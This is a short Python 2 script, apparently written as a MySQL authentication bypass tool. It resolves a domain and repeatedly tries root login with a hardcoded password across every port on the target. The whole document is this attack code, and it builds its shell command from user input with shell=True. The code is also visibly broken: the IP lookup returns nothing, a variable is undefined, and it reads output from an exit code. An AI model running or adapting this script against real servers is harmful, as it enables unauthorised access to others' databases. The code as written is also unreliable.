import urllib 
import urllib2 
import cookielib 
import sys
import subprocess
import socket

def getIP(domain):
    myaddr = socket.getaddrinfo(domain, 'http')
    print(myaddr[0][4][0])

def MySQLAuthenticationBypassCheck(host,port):
    port=0
    i=0
    while i<300:
        i=i+1
        while port<65536:
            port=port+1
            pi=subprocess.Popen("mysql --host=%s -P %s -uroot -piswin" % (host,port),shell=True).wait()
            print pi.stdout.read()

if __name__ == '__main__':
    website=input('Domain (Example: google.com):')
    host=getIP(website)
    MySQLAuthenticationBypassCheck(host,port)